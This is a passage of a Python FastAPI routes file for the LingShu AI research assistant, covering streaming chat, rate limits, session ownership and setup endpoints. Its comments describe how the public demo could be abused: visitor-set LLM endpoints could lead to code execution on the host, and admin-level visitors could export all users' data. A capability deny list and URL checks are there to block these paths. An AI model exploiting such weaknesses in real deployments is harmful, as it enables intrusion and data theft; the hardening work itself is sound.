"""Research API (灵枢) — routes for the AI research assistant."""
import asyncio
import json
import logging
import os
import queue
import re
import secrets
import threading
import time
import uuid
from pathlib import Path

from fastapi import APIRouter, Request, Query
from fastapi.responses import HTMLResponse, JSONResponse, StreamingResponse
from pydantic import BaseModel

from agent_harness.core.auth import auth_db as _auth_db
from agent_harness.core.config import SKILLS_DIR as _LINGSHU_SKILLS_DIR
from agent_harness.core.auth import auth_jwt as _auth_jwt
from agent_harness.core.auth.api_security import (
    load_or_generate_token,
)
from agent_harness.core.auth.api_security import (
    reset_token as _reset_token,
)
from agent_harness.core.tools.tool_config import is_tool_enabled
from agent_harness.core.tools.tool_config import list_disabled as _list_disabled_tools
from agent_harness.core.tools.tool_config import toggle_tool as _toggle_tool
from agent_harness.core.pipeline.cancel import cancel_task as _cancel_task
from agent_harness.core.pipeline.cancel import register_task as _register_cancel_task
from agent_harness.core.pipeline.cancel import unregister_task as _unregister_cancel_task
from agent_harness.core.pipeline.session_store import (
    delete_session as _delete_session,
)
from agent_harness.core.pipeline.session_store import (
    list_sessions as _list_sessions,
)
from agent_harness.core.pipeline.session_store import (
    load_session as _load_session,
)
from agent_harness.core.pipeline.session_store import (
    save_session as _save_session,
)
from agent_harness.core.pipeline.session_store import (
    session_count as _session_count,
)
from agent_harness.core.agent_log import clear_logs as _clear_logs
from agent_harness.core.agent_log import get_logs as _get_logs
from agent_harness.core.agent_cron import add_task as _cron_add
from agent_harness.core.agent_cron import delete_task as _cron_delete
from agent_harness.core.agent_cron import get_task as _cron_get
from agent_harness.core.agent_cron import list_tasks as _cron_list
from agent_harness.core.agent_cron import update_task as _cron_update
from agent_harness.plugin_loader import list_plugins as _plugin_list

HOST = os.environ.get("HARNESS_API_HOST", "127.0.0.1")
PORT = int(os.environ.get("HARNESS_API_PORT", "8788"))

# ─── API Key (CLI / Open WebUI fallback) ───
_API_TOKEN: str = load_or_generate_token()
logger = logging.getLogger(__name__)

# ─── Rate limiter ───
_RATE_LIMIT_WINDOW = 60
_RATE_LIMIT_MAX = int(os.environ.get("HARNESS_RATE_LIMIT", "100"))
_RATE_LIMIT_ENABLED = os.environ.get("HARNESS_DISABLE_RATE_LIMIT", "").lower() not in ("1", "true", "yes")
_rate_limit_store: dict[str, list[float]] = {}

def _check_rate_limit(ip: str) -> bool:
    if not _RATE_LIMIT_ENABLED:
        return True
    now = time.time()
    window_start = now - _RATE_LIMIT_WINDOW
    timestamps = _rate_limit_store.get(ip, [])
    timestamps = [t for t in timestamps if t > window_start]
    if len(timestamps) >= _RATE_LIMIT_MAX:
        return False
    timestamps.append(now)
    _rate_limit_store[ip] = timestamps[-_RATE_LIMIT_MAX:]
    if len(_rate_limit_store) > 10000:
        for k in list(_rate_limit_store.keys()):
            _rate_limit_store[k] = [t for t in _rate_limit_store[k] if t > window_start]
            if not _rate_limit_store[k]:
                del _rate_limit_store[k]
    return True

# mp-login 是未接真实客户端的半成品（docstring 自认 code currently unused）：默认关。
# 关时不注册路由（文件末尾条件注册）→ 任何人 404，且不进豁免名单：豁免=放行，
# 与"端点根本不存在"是两件事，别让半成品以最高信任配置常驻。
_MP_LOGIN_ENABLED = os.environ.get("HARNESS_ENABLE_MP_LOGIN", "").strip().lower() in ("1", "true", "yes")

_AUTH_EXEMPT_PREFIXES = ("/health", "/metrics", "/admin")
_AUTH_EXEMPT_EXACT = ("/", "/setup", "/dashboard")
_AUTH_EXEMPT_V1 = (
    ("/v1/auth/login", "/v1/auth/refresh", "/v1/auth/setup-admin")
    + (("/v1/auth/mp-login",) if _MP_LOGIN_ENABLED else ())
)

async def _acquire_agent_slot() -> bool:
    """Wait without blocking the event loop or leaving a waiter after cancellation."""
    deadline = time.monotonic() + _SEMAPHORE_TIMEOUT_S
    while _agent_semaphore is not None:
        if _agent_semaphore.acquire(blocking=False):
            return True
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            return False
        await asyncio.sleep(min(0.05, remaining))
    return False


# ─── Token optimization: conversation window ───
MAX_HISTORY_ROUNDS = int(os.environ.get("HARNESS_MAX_HISTORY", "8"))
MAX_HISTORY_MSGS = MAX_HISTORY_ROUNDS * 2
SESSION_TRIM_AT = MAX_HISTORY_ROUNDS * 4

# ─── Running task registry (for cancellation) ───
# session_id → 该会话自己的取消信号。信号本体注册在 core.pipeline.cancel 的注册表里
# （ENG-21：按 session 作用域，取消 A 不会波及 B），这里只是同对象的索引 + 列表展示用。
_running_tasks: dict[str, threading.Event] = {}
_running_tasks_lock = threading.Lock()


def _register_running_task(session_id: str) -> threading.Event | None:
    """登记一个运行中任务，返回它的取消信号（同一 session 复用同一个 event）。"""
    if not session_id:
        return None
    with _running_tasks_lock:
        event = _running_tasks.get(session_id)
        if event is None:
            event = _register_cancel_task(session_id)
            _running_tasks[session_id] = event
        return event


def _unregister_running_task(session_id: str) -> None:
    """任务收尾：两处注册表都清掉，避免残留（ENG-19 断开/结束路径共用）。"""
    if not session_id:
        return
    with _running_tasks_lock:
        _running_tasks.pop(session_id, None)
    _unregister_cancel_task(session_id)


# ─── Agent concurrency control ───
_MAX_CONCURRENT_AGENTS = int(os.environ.get("HARNESS_MAX_CONCURRENT_AGENTS", "5"))
_agent_semaphore = threading.Semaphore(_MAX_CONCURRENT_AGENTS) if _MAX_CONCURRENT_AGENTS > 0 else None
# 排队上限：等不到名额就 503，而不是无限挂住请求（流式/非流式共用）
_SEMAPHORE_TIMEOUT_S = 300
# 客户端断开后给 worker 的收尾窗口
_STREAM_JOIN_TIMEOUT_S = 5.0
# 排队超时后的统一回复（worker 侧；handler 侧返回 503 JSON）
_BUSY_REPLY = f"⚠️ 服务器繁忙，当前有 {_MAX_CONCURRENT_AGENTS} 个任务在执行中，请稍后重试。"

_LLM_UNREACHABLE_REPLY = (
    "⚠️ LLM 后端不可用，无法生成回复。\n\n"
    "请检查配置：\n"
    "- HARNESS_DEEPSEEK_API / HARNESS_CLOUD_KEY\n"
    "- 或 HARNESS_LLAMA_API（本地模型）\n\n"
    "详细配置说明：https://github.com/kisaragiy/lingShu"
)


# ─── 证据链落盘 ───
# 为什么要在会话里存 provenance/factcheck：此前只存 role/content/ts，刷新页面后
# 来源与核验结果全丢 —— 「每条结论可回溯」就只在单次请求的生命周期内成立。
# session_store 的 message 事件会保留消息的全部字段，所以挂上就能落盘 + 原样读回。

_PROV_MAX_ITEMS = 40      # 每轮最多存多少条来源（防止会话 JSONL 无界膨胀）
_PROV_TEXT_LIMIT = 200    # snippet/title 截断长度


def _slim_provenance(provenance) -> list[dict]:
    """瘦身 provenance：只留可核对字段，长文本截断。"""
    out: list[dict] = []
    for p in (provenance or [])[:_PROV_MAX_ITEMS]:
        if not isinstance(p, dict):
            continue
        out.append({
            "url": str(p.get("url") or "")[:500],
            "title": str(p.get("title") or "")[:_PROV_TEXT_LIMIT],
            "tool": str(p.get("tool") or "")[:40],
            "fetched_at": str(p.get("fetched_at") or "")[:40],
            "snippet": str(p.get("snippet") or "")[:_PROV_TEXT_LIMIT],
            "status": str(p.get("status") or "")[:20],
        })
    return out


def _sources_from_provenance(provenance) -> list[dict]:
    """provenance → 引用列表（按 URL 去重，保留首个标题）。与 demo 脚本同口径。"""
    seen: set[str] = set()
    out: list[dict] = []
    for p in provenance or []:
        if not isinstance(p, dict):
            continue
        url = str(p.get("url") or "").strip()
        if not url or url in seen:
            continue
        seen.add(url)
        out.append({"url": url, "title": str(p.get("title") or "")[:120]})
    return out


def _evidence_from_session(session_id: str, owner_id: str, role: str):
    """从会话最后一条带 provenance 的 assistant 消息里取证据链。

    返回 (provenance, factcheck, error_response)。owner 校验在这里做：
    会话里含 URL 与摘录，取错人等于数据泄露。
    """
    from agent_harness.core.pipeline.session_store import get_session_summary

    summary = get_session_summary(session_id)
    if not summary:
        return None, None, JSONResponse({"error": "来源会话不存在"}, status_code=404)
    sess_owner = summary.get("owner_id", "")
    if sess_owner and sess_owner != owner_id and role != "admin":
        return None, None, JSONResponse({"error": "无权访问该会话"}, status_code=403)

    for msg in reversed(_load_session(session_id) or []):
        if msg.get("role") == "assistant" and msg.get("provenance"):
            return msg.get("provenance"), msg.get("factcheck"), None
    return None, None, None


def _build_history_context(messages: list[dict]) -> str:
    if not messages:
        return ""
    trimmed = messages[-(MAX_HISTORY_MSGS):]
    lines = []
    for m in trimmed:
        role = m.get("role", "unknown")
        content = m.get("content", "")
        if len(content) > 300:
            content = content[:300] + "..."
        lines.append(f"[{role}]: {content}")
    return "\n".join(lines[-16:])


def _sse_chunk(content: str, role: str = "") -> str:
    delta = {}
    if role:
        delta["role"] = role
    if content:
        delta["content"] = content
    obj = {
        "choices": [{"delta": delta, "index": 0, "finish_reason": None}]
    }
    return f"data: {json.dumps(obj, ensure_ascii=False)}\n\n"


def _sse_done(result_text: str) -> str:
    usage = {"prompt_tokens": 0, "completion_tokens": len(result_text), "total_tokens": 0}
    obj = {
        "choices": [{"delta": {}, "index": 0, "finish_reason": "stop"}],
        "usage": usage,
    }
    return f"data: {json.dumps(obj, ensure_ascii=False)}\n\ndata: [DONE]\n\n"


# ─── Execute harness ───

def _execute_multi(prompt: str, history_context: str, session_id: str = "", kb_scope: str = "") -> dict:
    from agent_harness.core.graph.graph_multi import (
        default_checkpointer,
        get_progress_queue,
        run_multi_agent,
    )
    enhanced = prompt
    if history_context:
        enhanced = (
            f"以下是本对话的历史记录（越新的越靠前）:\n{history_context}\n\n"
            f"请基于以上对话上下文，回答用户当前的问题:\n{prompt}"
        )
    try:
        from agent_harness.core.tools.rag_store import list_collections
        from agent_harness.core.tools.rag_store import query as rag_query
        kb_cols = [c for c in list_collections() if not kb_scope or c.startswith(kb_scope)]
        if kb_cols:
            kb_results = []
            kb_failures: list[str] = []
            for col in kb_cols:
                try:
                    results = rag_query(prompt, collection=col, top_k=3)
                    kb_results.extend(results)
                except Exception as exc:  # noqa: BLE001 — P1-10：失败必须可见，不能吞
                    kb_failures.append(f"{col}: {exc}")
                    logger.warning("知识库检索失败（collection=%s）：%s", col, exc)
            if kb_failures and not kb_results:
                # 嵌入服务不可用 / 全部 collection 失败：告诉用户，而不是装作没知识库
                _pq_fail = get_progress_queue(session_id)
                if _pq_fail:
                    _pq_fail.put({
                        "type": "status",
                        "content": f"⚠️ 知识库不可用（原因：{kb_failures[0]}），本次回答未使用知识库\n",
                    })
            if kb_results:
                kb_context = "\n\n".join(
                    "[知识库 - {}] {}".format(r.get("source", "unknown"), r["text"])
                    for r in kb_results[:3]
                )
                enhanced = (
                    f"以下是从知识库中检索到的相关信息（请优先使用这些信息回答）:\n{kb_context}\n\n"
                    f"用户问题: {enhanced}"
                )
                _pq = get_progress_queue(session_id)
                if _pq:
                    _pq.put({
                        "type": "progress",
                        "content": f"📚 从知识库中找到 {len(kb_results)} 条相关信息\\n"
                    })
    except Exception as exc:  # noqa: BLE001 — 知识库初始化失败也要留痕（P1-10）
        logger.warning("知识库初始化失败：%s", exc)
    # session_id 作为 task_id 透传到 supervisor/worker，取消信号才按会话生效（ENG-21）
    # SEC-2：把可见作用域交给数据层兜底 —— worker 线程经 copy_context 继承，
    # 因此 agent 工具（rag_query/rag_index）即使被诱导传别人的 collection 名也会被拒。
    from agent_harness.core.tools import rag_store as _rag_scope_store
    _scope_tok = _rag_scope_store.set_scope(kb_scope)
    try:
        # P0-3：session_id 作 thread_id + SQLite checkpointer → 崩溃后用
        # resume=True 同 session 续跑，已完成节点不重算
        return run_multi_agent(
            enhanced,
            task_id=session_id,
            checkpointer=default_checkpointer(),
        )
    finally:
        _rag_scope_store.reset_scope(_scope_tok)


def _execute_single(prompt: str, history_context: str, kb_scope: str = "") -> str:
    from agent_harness.core.graph import run as run_single
    enhanced = prompt
    if history_context:
        enhanced = f"以下是对话历史:\n{history_context}\n\n当前问题: {prompt}"
    try:
        from agent_harness.core.tools.rag_store import list_collections
        from agent_harness.core.tools.rag_store import query as rag_query
        kb_cols = [c for c in list_collections() if not kb_scope or c.startswith(kb_scope)]
        if kb_cols:
            kb_results = []
            kb_failures: list[str] = []
            for col in kb_cols:
                try:
                    results = rag_query(prompt, collection=col, top_k=2)
                    kb_results.extend(results)
                except Exception as exc:  # noqa: BLE001 — P1-10：失败必须可见，不能吞
                    kb_failures.append(f"{col}: {exc}")
                    logger.warning("知识库检索失败（collection=%s）：%s", col, exc)
            if kb_failures and not kb_results:
                # 单 Agent 路径没有进度队列 → 把失败写进上下文，防止模型声称「查过知识库」
                enhanced = (
                    f"（系统提示：知识库检索失败，原因：{kb_failures[0]}。"
                    f"本次回答未使用任何知识库内容，不要声称已查阅知识库。）\n\n{enhanced}"
                )
            if kb_results:
                kb_context = "\n".join(
                    "[知识库] {}".format(r["text"]) for r in kb_results[:2]
                )
                enhanced = f"知识库信息:\n{kb_context}\n\n{enhanced}"
    except Exception as exc:  # noqa: BLE001 — 知识库初始化失败也要留痕（P1-10）
        logger.warning("知识库初始化失败：%s", exc)
    from agent_harness.core.tools import rag_store as _rag_scope_store
    _scope_tok = _rag_scope_store.set_scope(kb_scope)
    try:
        return run_single(enhanced)
    finally:
        _rag_scope_store.reset_scope(_scope_tok)


def _run_with_queue(prompt: str, history: str, model: str, q: queue.Queue, session_id: str = "",
                    kb_scope: str = "", pre_acquired: bool = False):
    """Worker 线程体：把 agent 事件塞进 queue。

    pre_acquired=True 表示并发名额已由调用方（流式 handler）acquire 过：这里既不再
    acquire，也**不 release** —— 计数由持有者配平；否则信号量被过度释放，
    `_MAX_CONCURRENT_AGENTS` 形同失效。
    """
    acquired_here = False
    # P0-2：进度队列按 session_id 作用域登记 —— 并发请求各用各的队列，
    # 一个请求结束只清自己的（原实现是无条件 clear 全局，会掐断别人的 SSE）。
    _pq_key = session_id or ""
    try:
        from agent_harness.core.graph.graph_multi import set_progress_queue
        set_progress_queue(q, key=_pq_key)
        if not pre_acquired and _agent_semaphore is not None:
            # 必须检查返回值：acquire 超时返回 False，此时既没拿到名额，
            # 也绝不能在 finally 里 release —— 否则每超时一次就把并发上限放大 1，
            # 最后一道闸门自己漏光。
            acquired_here = _agent_semaphore.acquire(timeout=_SEMAPHORE_TIMEOUT_S)
            if not acquired_here:
                q.put({"type": "error", "content": _BUSY_REPLY})
                q.put({"type": "done"})
                return
        if session_id:
            _register_running_task(session_id)
        q.put({"type": "status", "content": "🤔 分析请求中...\n"})
        if model in ("agent-harness", "agent-harness-single", "lingShu-fast"):
            q.put({"type": "status", "content": "⚡ 快模式（单 Agent）处理中...\n"})
            result = _execute_single(prompt, history, kb_scope=kb_scope)
            q.put({"type": "result", "content": result})
        else:
            q.put({"type": "status", "content": "🧠 深模式（多 Agent 编排）执行中...\n"})
            result = _execute_multi(prompt, history, session_id=session_id, kb_scope=kb_scope)
            rounds = result.get("rounds", 1)
            worker_results = result.get("worker_results", {})
            workers = list(worker_results.keys())
            errors = result.get("errors", [])
            if workers:
                status_line = f"✅ {len(workers)} 个 Worker 完成 ({rounds} 轮): {', '.join(workers)}\\n"
                q.put({"type": "status", "content": status_line})
            if errors:
                q.put({"type": "status", "content": f"⚠️ {len(errors)} 个错误\\n"})
            final = result.get("final_output", "")
            if final:
                q.put({"type": "result", "content": final})
            else:
                q.put({"type": "result", "content": final or _LLM_UNREACHABLE_REPLY})
            # 证据链随事件交给 SSE 侧落盘（流式路径此前只传文本，刷新后来源全丢）
            _prov = _slim_provenance(result.get("provenance"))
            if _prov:
                q.put({"type": "evidence", "provenance": _prov,
                       "factcheck": result.get("factcheck") or {}})
        q.put({"type": "done"})
    except Exception as e:
        import traceback
        tb = traceback.format_exc()
        q.put({"type": "error", "content": f"❌ 执行出错: {e}\n\n{tb[:500]}"})
        q.put({"type": "done"})
    finally:
        try:
            if acquired_here and _agent_semaphore is not None:
                _agent_semaphore.release()
            from agent_harness.core.graph.graph_multi import clear_progress_queue
            clear_progress_queue(_pq_key)
            if session_id:
                _unregister_running_task(session_id)
        except Exception:
            pass


async def _stream_progress(prompt: str, history: str, model: str, session_id: str, kb_scope: str = "",
                           owner_id: str = "", sem_acquired: bool = False):
    """SSE generator：转发 worker 事件，并在收尾时把任务资源全部还回去。

    sem_acquired=True 表示 handler 层已经 acquire 过并发名额（ENG-19）——释放由这里
    在 finally 里做一次，worker 那边（pre_acquired=True）不碰信号量，计数才配平。

    客户端断开时 Starlette 会 `aclose()` 这个 generator（CancelledError/GeneratorExit），
    finally 因此一定会跑：先 cancel 掉本 session 的任务（worker 里已有 is_cancelled
    checkpoint，会早退省 token），再等它收尾、清注册表。
    """
    q = queue.Queue()
    _register_running_task(session_id)
    t = threading.Thread(
        target=_run_with_queue,
        args=(prompt, history, model, q, session_id, kb_scope),
        kwargs={"pre_acquired": sem_acquired},
        daemon=True,
    )
    t.start()
    result_text = ""
    _stream_evidence = None   # 收到 evidence 事件才会被赋值；单 Agent / 失败路径保持 None
    finished = False
    try:
        yield _sse_chunk("", role="assistant")
        while True:
            try:
                event = await asyncio.to_thread(q.get, timeout=0.5)
            except queue.Empty:
                if not t.is_alive():
                    break
                continue
            if event["type"] == "done":
                break
            elif event["type"] in ("error", "status", "progress"):
                content = event["content"]
                result_text += content
                yield _sse_chunk(content)
            elif event["type"] == "result":
                content = event["content"]
                result_text = content
                yield _sse_chunk(content)
            elif event["type"] == "evidence":
                # 不推给前端（前端只需要正文），只留在服务端用于落盘
                _stream_evidence = {
                    "provenance": event.get("provenance") or [],
                    "factcheck": event.get("factcheck") or {},
                }
        session = _load_session(session_id) or []
        session.append({"role": "user", "content": prompt, "ts": time.time()})
        _assistant_msg = {"role": "assistant", "content": result_text, "ts": time.time()}
        if _stream_evidence and _stream_evidence.get("provenance"):
            _assistant_msg["provenance"] = _stream_evidence["provenance"]
            if _stream_evidence.get("factcheck"):
                _assistant_msg["factcheck"] = _stream_evidence["factcheck"]
        session.append(_assistant_msg)
        # 流式路径此前不写 owner → 会话无主，用户自己回看会被 404（与非流式不一致）
        _save_session(session_id, session, owner_id=owner_id)
        finished = True
        yield _sse_done(result_text)
    finally:
        if not finished:
            # 半截 session 不保存；只发取消信号，让 worker 在下一个 checkpoint 早退
            _cancel_task(session_id)
        # 给 worker 收尾窗口（有界，避免无限等一个卡死的工具调用）
        await asyncio.to_thread(t.join, timeout=_STREAM_JOIN_TIMEOUT_S)
        _unregister_running_task(session_id)
        if sem_acquired and _agent_semaphore is not None:
            _agent_semaphore.release()


# ─── FastAPI router ───

router = APIRouter()

class ChatRequest(BaseModel):
    model: str = "agent-harness-multi"
    messages: list[dict] = []
    stream: bool = False
    max_tokens: int = 4096
    temperature: float = 0.7


@router.get("/health")
async def health():
    return {
        "status": "ok",
        "version": "1.0.0",
        "service": "agent-harness",
        "active_sessions": _session_count(),
    }


@router.get("/v1/models")
async def list_models():
    now = int(time.time())
    return {
        "object": "list",
        "data": [
            {
                "id": "lingShu-deep",
                "object": "model",
                "created": now,
                "owned_by": "harness",
                "description": "多 Agent 深度模式 — Supervisor-Worker 编排",
            },
            {
                "id": "agent-harness-multi",
                "object": "model",
                "created": now,
                "owned_by": "harness",
                "description": "多 Agent 深度模式（兼容旧名）",
            },
            {
                "id": "lingShu-fast",
                "object": "model",
                "created": now,
                "owned_by": "harness",
                "description": "单 Agent 快速模式 — 轻量任务秒回",
            },
            {
                "id": "agent-harness",
                "object": "model",
                "created": now,
                "owned_by": "harness",
                "description": "单 Agent 快速模式（兼容旧名）",
            },
        ],
    }


@router.post("/v1/chat/completions")
async def chat_completions(req: ChatRequest, request: Request):
    session_id = request.headers.get("X-Session-Id", "") or str(uuid.uuid4())
    if not req.messages:
        return JSONResponse({"error": "No messages provided"}, status_code=400)
    last_user_msg = ""
    for msg in reversed(req.messages):
        if msg.get("role") == "user" and isinstance(msg.get("content"), str):
            last_user_msg = msg["content"]
            break
    if not last_user_msg:
        return JSONResponse({"error": "No user message found"}, status_code=400)

    try:
        session_id = _safe_path_param(session_id)
    except ValueError:
        return JSONResponse({"error": "Invalid session ID"}, status_code=400)
    from agent_harness.core.pipeline.session_store import claim_session
    user = getattr(request.state, "user", None) or {}
    if not user.get("id"):
        return JSONResponse({"error": "Authentication required"}, status_code=401)
    try:
        session_owner = claim_session(session_id, user["id"], is_admin=user.get("role") == "admin")
    except PermissionError:
        return JSONResponse({"error": "Session unavailable"}, status_code=404)

    # ── Demo mode: no LLM backend → use injected fallback ──
    # 由 composition root（main.py）注入 cs_demo 的能力：**app 之间不互相 import**
    # （ADR#9 rule2）。此前这里是 lazy `from apps.cs_demo... import run_cs_agent`，
    # 人眼和 grep 都容易漏，是 AST 守卫抓出来的。
    from agent_harness.core.config import LLAMA_API, CLOUD_API_KEY
    if not LLAMA_API and not CLOUD_API_KEY:
        if _demo_chat_fallback is None:
            return JSONResponse(
                {"error": "demo 回退未注册（应由 main.py 注入 cs_demo 能力）"}, status_code=503)
        result = _demo_chat_fallback(last_user_msg)
        reply = result.get("reply", "")
        # 注：本分支此前还会算 `intent` 与 `quick_replies` 却**全部丢弃**（而 cs_demo 自己的
        # API 已发布 `quick_replies`、前端也有 `.quick-replies` 样式）。是否把它们加进本端点
        # 响应属于**响应契约变更**，待 @user 拍板后单独提交，不混进本轮修复
        # （同 query_decompose 的「契约 3 条 vs 实现 5 条」处置原则）。
        if req.stream:
            async def _demo_stream():
                yield "data: " + json.dumps({"choices": [{"delta": {"role": "assistant", "content": reply}}]}) + "\n\n"
                yield "data: [DONE]\n\n"
            return StreamingResponse(_demo_stream(), media_type="text/event-stream")
        return JSONResponse({
            "id": "chatcmpl-" + str(int(time.time())),
            "object": "chat.completion", "model": req.model,
            "choices": [{"index": 0, "message": {"role": "assistant", "content": reply}, "finish_reason": "stop"}],
        })

    last_user_idx = -1
    for i in range(len(req.messages) - 1, -1, -1):
        if req.messages[i].get("role") == "user":
            last_user_idx = i
            break
    history_messages = req.messages[:last_user_idx]
    history_context = _build_history_context(history_messages)
    print(f"[Harness] [{session_id[:8]}] model={req.model} stream={req.stream} msg={last_user_msg[:60]}... history={len(history_messages)}")

    if req.stream:
        # ENG-19：默认路径（前端 stream=true）也必须过并发闸门。信号量是 threading 的，
        # 直接阻塞 acquire 会卡住 event loop；使用可取消的异步等待。
        sem_acquired = False
        if _agent_semaphore is not None:
            # 取消等待不会留下后台 acquire，也不会丢失名额。
            sem_acquired = await _acquire_agent_slot()
            if not sem_acquired:
                return JSONResponse(
                    {"error": f"服务器繁忙，当前有 {_MAX_CONCURRENT_AGENTS} 个任务在执行中，请稍后重试"},
                    status_code=503,
                )
        return StreamingResponse(
            _stream_progress(last_user_msg, history_context, req.model, session_id,
                             _kb_scope_prefix(request), session_owner,
                             sem_acquired=sem_acquired),
            media_type="text/event-stream",
            headers={
                "Cache-Control": "no-cache",
                "Connection": "keep-alive",
                "X-Accel-Buffering": "no",
                "X-Session-Id": session_id,
            },
        )

    owner_id = session_owner
    acquired = False
    try:
        if _agent_semaphore is not None:
            acquired = await _acquire_agent_slot()
            if not acquired:
                return JSONResponse(
                    {"error": f"服务器繁忙，当前有 {_MAX_CONCURRENT_AGENTS} 个任务在执行中，请稍后重试"},
                    status_code=503,
                )
        _register_running_task(session_id)

        if req.model in ("agent-harness", "agent-harness-single", "lingShu-fast"):
            # 单 Agent 分支不产出结构化结果：显式初始化，避免下面取 provenance 时 NameError
            result: dict = {}
            response_text = await asyncio.get_event_loop().run_in_executor(
                None, _execute_single, last_user_msg, history_context, _kb_scope_prefix(request)
            )
            rounds = 1
            workers = []
        else:
            result = await asyncio.get_event_loop().run_in_executor(
                None, _execute_multi, last_user_msg, history_context, session_id, _kb_scope_prefix(request)
            )
            response_text = result.get("final_output", "") or _LLM_UNREACHABLE_REPLY
            rounds = result.get("rounds", 1)
            workers = list(result.get("worker_results", {}).keys())

        if not response_text or response_text.startswith("[Harness]") or response_text.startswith("[HarnessError]"):
            response_text = _LLM_UNREACHABLE_REPLY

        session = _load_session(session_id) or []
        session.append({"role": "user", "content": last_user_msg, "ts": time.time()})
        _assistant_msg = {"role": "assistant", "content": response_text, "ts": time.time()}
        # 证据链随消息落盘：否则刷新页面后来源与核验结果全丢
        _prov = _slim_provenance(result.get("provenance") if isinstance(result, dict) else None)
        if _prov:
            _assistant_msg["provenance"] = _prov
        _fc = result.get("factcheck") if isinstance(result, dict) else None
        if isinstance(_fc, dict) and _fc:
            _assistant_msg["factcheck"] = _fc
        session.append(_assistant_msg)
        if len(session) > SESSION_TRIM_AT:
            session = session[-SESSION_TRIM_AT:]
        _save_session(session_id, session, owner_id=owner_id)

        print(f"[Harness] [{session_id[:8]}] ✅ ({len(response_text)} chars, {rounds} 轮, workers: {workers})")

    except Exception as e:
        import traceback
        traceback.print_exc()
        err_str = str(e)
        if "semaphore" in err_str.lower():
            response_text = "[HarnessError] 服务器繁忙，请稍后重试"
        elif "timeout" in err_str.lower():
            response_text = "[HarnessError] 请求超时，搜索或 LLM 调用耗时过长，请简化问题后重试"
        elif "API key" in err_str or "401" in err_str or "Unauthorized" in err_str:
            response_text = "[HarnessError] LLM API 认证失败，请检查 API Key 配置"
        elif "rate limit" in err_str.lower() or "429" in err_str:
            response_text = "[HarnessError] API 调用频率过高，请等待后重试"
        else:
            response_text = f"[HarnessError] {err_str[:200]}"
    finally:
        if acquired and _agent_semaphore is not None:
            _agent_semaphore.release()
        _unregister_running_task(session_id)

    return {
        "id": f"chatcmpl-{int(time.time())}",
        "object": "chat.completion",
        "created": int(time.time()),
        "model": req.model,
        "choices": [
            {
                "index": 0,
                "message": {"role": "assistant", "content": response_text},
                "finish_reason": "stop",
            }
        ],
        "usage": {
            "prompt_tokens": 0,
            "completion_tokens": len(response_text),
            "total_tokens": 0,
        },
    }


# ─── Demo 回退注入点（composition root 调 set_demo_chat_fallback 注册）───
_demo_chat_fallback = None


def set_demo_chat_fallback(fn) -> None:
    """由 main.py 注入 cs_demo 的 chat 能力（避免 research → cs_demo 的跨 app import）。"""
    global _demo_chat_fallback
    _demo_chat_fallback = fn


# ─── Setup API ───

def _get_cm():
    from agent_harness.core.pipeline import config_manager
    return config_manager


@router.get("/v1/setup/config")
async def get_config():
    cm = _get_cm()
    cfg = cm.redact_config(cm.load_config())
    # 搜索密钥同 llm.api_key 一个口径：连密文都不外传。
    # 状态查询走 GET /v1/setup/search-key（只报布尔）。
    s = cfg.get("search")
    if isinstance(s, dict):
        cfg["search"] = {
            k: v for k, v in s.items()
            if k not in ("api_key", "api_key_enc", "tavily_key", "tavily_key_enc")
        }
    return cfg


# 公开 demo 下"访客自带 key"这条设计路径本身就是 RCE 链第一环（render.yaml 注释承认了该意图）：
# 访客可写 llm.api_url → 服务器按访客的端点发 LLM 请求 → agent 工具链在部署主机上执行。
# demo 的访客身份又是 role="admin"（main.py:115），所以**角色闸在这里没用**，只能按模式拒写。
_DEMO_ALLOW_LLM_CONFIG = os.environ.get("HARNESS_DEMO_ALLOW_LLM_CONFIG", "").strip().lower() in ("1", "true", "yes")


# ─── demo 能力表（ADR#11：按**后果语义**定义，不按端点枚举）───
# 公开 demo（DISABLE_AUTH=1）的访客身份是 role="admin"（main.py:115），角色闸在 demo 下等于没闸。
# 按端点逐个打补丁必漏（skills/marketplace/install、tools/{name}/toggle 都是这么被漏掉的），
# 所以这里按"这个操作会造成什么后果"列能力，端点只做映射：
#   write_server_config  改服务器配置（访客可控 llm.api_url + 完整工具链 = 在部署主机上执行代码）
#   create_account       建持久账号（公网可自建管理员）
#   global_toggle        全局开关（把工具/技能一个个关掉 = 持久 DoS）
#   write_host_state     写宿主状态（技能/插件目录，跨产品边界）
#   run_external_process 起外部进程（skillhub install …）
#   export_all_data     一键导出**所有人的**数据（admin 身份 + `owner_filter=None`）
_DEMO_DENIED_CAPS = {
    "write_server_config",
    "create_account",
    "global_toggle",
    "write_host_state",
    "run_external_process",
    # 导出三兄弟的 owner 过滤对 admin 失效（`owner_filter = None if is_admin`），
    # 而 demo 访客即 admin → 任何访客能转储所有人的会话/报告。自托管保留一键导出。
    "export_all_data",
}

# 旧开关名保留（已发布的止血开关，别让它的语义悄悄变）
_LEGACY_CAP_ENV = {"write_server_config": "HARNESS_DEMO_ALLOW_LLM_CONFIG"}


def _capability_denied(cap: str) -> bool:
    """demo 下按能力拒绝。要放开某项必须显式设 `HARNESS_DEMO_ALLOW_<CAP>=1`（fail-closed）。"""
    from agent_harness.core.config import DISABLE_AUTH
    if not DISABLE_AUTH:
        return False
    names = [f"HARNESS_DEMO_ALLOW_{cap.upper()}"]
    if cap in _LEGACY_CAP_ENV:
        names.append(_LEGACY_CAP_ENV[cap])
    for n in names:
        if os.environ.get(n, "").strip().lower() in ("1", "true", "yes"):
            return False
    return cap in _DEMO_DENIED_CAPS


@router.post("/v1/setup/config")
async def save_config(request: Request):
    if _capability_denied("write_server_config"):
        return JSONResponse(
            {"error": "演示模式禁止修改服务器配置（如需'访客自带 key'，需先给 agent 工具做能力门，"
                      "再设 HARNESS_DEMO_ALLOW_WRITE_SERVER_CONFIG=1）"},
            status_code=403,
        )
    body = await request.json()
    # scheme 白名单：只允许 http/https（`file://`、`javascript:` 之类不得进 LLM 客户端）
    llm = (body or {}).get("llm") or {}
    api_url = str(llm.get("api_url", "") or "").strip()
    if api_url and not api_url.lower().startswith(("http://", "https://")):
        return JSONResponse({"error": "llm.api_url 必须以 http:// 或 https:// 开头"}, status_code=400)
    return _get_cm().save_config(body)


@router.get("/v1/setup/check-paths")
async def check_paths():
    return _get_cm().check_paths()


# ─── BYOK：用户自带搜索 key（DeepSeek / Tavily）───
# 明文只在请求体里出现一次：立刻加密落盘，不回传、不打日志、不写明文。
# 状态接口只报布尔 —— 与 redact_config 同一原则（前4后4 会泄掉一半密钥）。
_SEARCH_KEY_FIELDS = {
    "deepseek": ("api_key", "api_key_enc"),
